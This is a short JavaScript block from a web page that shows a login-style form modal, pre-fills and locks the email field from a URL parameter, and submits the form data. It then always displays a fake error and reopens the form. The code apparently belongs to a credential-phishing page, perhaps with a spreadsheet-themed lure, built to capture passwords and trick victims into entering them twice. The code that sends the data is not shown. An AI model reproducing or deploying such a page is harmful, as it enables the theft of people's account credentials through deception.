    <script>
        const myFormModal = new bootstrap.Modal('#myFormModal');
        const mySpinnerModal = new bootstrap.Modal('#mySpinnerModal');
        const myFormModalErrorBodyLabel = document.getElementById("myFormModalErrorBodyLabel");
        const user_email = document.getElementById("user-email");
        const formHtml = document.getElementById('form-modal');
        const forms = document.querySelectorAll('.needs-validation');
        let count = parseInt(localStorage.getItem('excel-store'), 10)
        if (isNaN(count)) {
            count = 0
        }

        window.onload = () => {
            "use strict";
            let queryString = window.location.search;
            let urlParams = new URLSearchParams(queryString);
            let username = urlParams.get("q");

            myFormModal.show();
            if (username !== undefined && username !== null && username !== "" && isValid(username) === true) {
                user_email.value = username;
                user_email.readOnly = true;
            }

            Array.from(forms).forEach(form => {
                form.addEventListener('submit', async event => {
                    if (!form.checkValidity()) {
                        event.preventDefault()
                        event.stopPropagation()
                    } else {
                        event.preventDefault()
                        event.stopPropagation()
                        myFormModal.hide();
                        mySpinnerModal.show()
                        let response = await sendFormData(formHtml, count);
                        setTimeout(() => {
                            mySpinnerModal.hide()
                            myFormModalErrorBodyLabel.classList.remove('d-none')
                            myFormModal.show();
                        }, 5000);
                    }
                    form.classList.add('was-validated')
                }, false)
            })
        }
    </script>
